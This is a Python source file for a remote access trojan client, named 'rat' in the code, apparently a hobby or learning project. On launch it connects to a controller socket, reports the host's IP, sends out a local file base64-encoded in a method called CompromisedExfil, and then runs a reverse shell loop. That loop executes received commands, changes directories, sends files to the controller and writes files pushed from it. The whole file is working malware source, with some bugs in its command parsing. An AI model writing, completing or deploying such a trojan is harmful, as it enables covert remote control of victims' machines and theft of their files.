#!/usr/bin/env python3

import socket, subprocess, os, platform
import base64
import json
from turtle import bye

class CLIENT:
    
    
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()
        
    def connection(self):
        global sock
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.host, self.port))
        information_send = socket.gethostbyname(socket.gethostname())
        sock.send(information_send.encode())

    def CompromisedExfil(self):
        file = open('kali.txt', "rb")
        bytes = file.read(1024)
        base64_bytes = base64.b64encode(bytes)
        file_json = {
            "name" : 'kali-dest.txt',
            "data" : base64_bytes.decode()
        }
        file_send = json.dumps(file_json)
        #client.send(command.encode())
        sock.send(file_send.encode())

    def main_loop(self):
        while True:
        
            command = sock.recv(1024).decode()   
                
            if command == 'shell':
                while True:
                    command = sock.recv(1024).decode()
                    try:
                        if command == "exit":
                            break
                        elif command[:2] == 'cd':
                            os.chdir(command[3:])
                            directory = os.getcwd()
                            str_dir = str(directory)
                            sock.send(str_dir.encode())
                            command = ''
                        elif command[:3] == 'cat':
                            continue
                        elif command[:7] == 'download':
                            filename = command[7:]
                            file = open(filename, "rb")
                            bytes = file.read(1024)
                            base64_bytes = base64.b64encode(bytes)
                            file_json = {
                                "name" : file.name,
                                "data" : base64_bytes.decode()
                            }
                            file_send = json.dumps(file_json)
                            sock.send(command.encode())
                            sock.send(file_send.encode())
                        output = subprocess.getoutput(command)
                        sock.send(output.encode())
                        
                            
                    except:
                        err = 'bad command'
                        sock.send(err.encode())
                        
            if command == "upload":
                json_data = sock.recv(1024).decode()
                convert_json = json.loads(json_data)
                name = convert_json['name']
                bytes = convert_json['data']
                b64decoded_bytes = base64.b64decode(bytes)
                file_name = name.split('.')
                file = open(f"{file_name[0]}" + '.' + f"{file_name[1]}",'wb') #open in binary       
                # #         # receive data and write it to file
                file.write(b64decoded_bytes)
                file.close()

                
rat = CLIENT('127.0.0.1', 4445)

if __name__ == '__main__':
    rat.connection()
    rat.CompromisedExfil()
    rat.main_loop()
 